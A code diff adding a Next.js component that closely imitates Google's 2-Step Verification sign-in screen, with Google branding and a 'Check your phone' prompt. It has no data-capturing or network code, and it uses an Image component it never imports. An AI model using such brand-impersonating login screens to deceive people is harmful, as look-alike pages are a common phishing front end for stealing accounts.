@@ -1,0 +1,55 @@
+import React from "react";
+import Head from "next/head";
+
+export default function Verification() {
+  return (
+    <div className="font-roboto min-h-screen md:flex flex-col justify-center items-center bg-white text-[#202124] text-base">
+      <div className="md:border border-slate-300 rounded-lg px-6 md:px-10 py-9 md:w-[450px] h-[500px]">
+        <div className="flex justify-center">
+          <Image src="/images/google.png" alt="google" width={82} height={30} />
+        </div>
+
+        <div className="mt-2.5">
+          <div className="text-center">
+            <h3 className="text-2xl">2-Step Verification</h3>
+            <p className="mt-3">
+              To help keep your account safe, Google wants to make sure it's
+              really you trying to sign in
+            </p>
+          </div>
+          <div className="">
+            <div className="">
+              <Image
+                src="/images/mobile.gif"
+                alt="google"
+                width={82}
+                height={80}
+              />
+            </div>
+            <div className="flex flex-col justify-start text-start m-3">
+              <h3 className="text-lg">Check your phone</h3>
+              <p className="mt-3">
+                Google sent a notification to your Phone. Tap Yes on the
+                notification to verify it's you.
+              </p>
+              <input type="checkbox" />
+              <p>Don't ask again on this device</p>
+              <button>
+                {" "}
+                <p className="text-sm text-[#1a73e8] cursor-pointer font-medium">
+                  Resend it
+                </p>
+              </button>
+              <button>
+                {" "}
+                <p className="text-sm text-[#1a73e8] cursor-pointer font-medium">
+                  Try another way
+                </p>
+              </button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  );
+}
